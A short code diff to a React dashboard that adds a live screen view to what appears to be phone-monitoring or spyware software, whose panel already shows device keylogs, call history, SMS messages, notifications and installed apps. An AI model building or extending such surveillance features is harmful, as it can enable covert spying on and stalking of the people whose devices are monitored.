@@ -12,6 +12,7 @@ import WebActivityList from '../components/WebActivityList';
 import NotificationList from '../components/NotificationList';
 import InstalledAppList from '../components/InstalledAppList';
 import KeylogList from '../components/KeylogList';
+import LiveScreenView from '../components/LiveScreenView';
 import { 
   PhoneCall, 
   MessageSquare, 
@@ -120,6 +121,8 @@ function DashboardPage() {
     if (diffHours < 24) return `${diffHours}h ago`;
     return lastSeenDate.toLocaleDateString();
   };
+
+  const selectedDevice = devices.find(d => d.id === selectedDeviceId);
 
   const filteredData = {
     callLogs: data.callLogs.filter(item => !selectedDeviceId || item.device_id === selectedDeviceId),
@@ -263,6 +266,9 @@ function DashboardPage() {
       case 'keylogs':
         return <KeylogList keylogs={filteredData.keylogs} />;
 
+      case 'live-view':
+        return <LiveScreenView selectedDevice={selectedDevice} />;
+
       default:
         return null;
     }
@@ -270,6 +276,7 @@ function DashboardPage() {
 
   const navItem = [
     { id: 'devices', label: 'Connected Devices' },
+    { id: 'live-view', label: 'Live View' },
     { id: 'calls', label: 'Call History' },
     { id: 'sms', label: 'Messages' },
     { id: 'notifications', label: 'Notifications' },
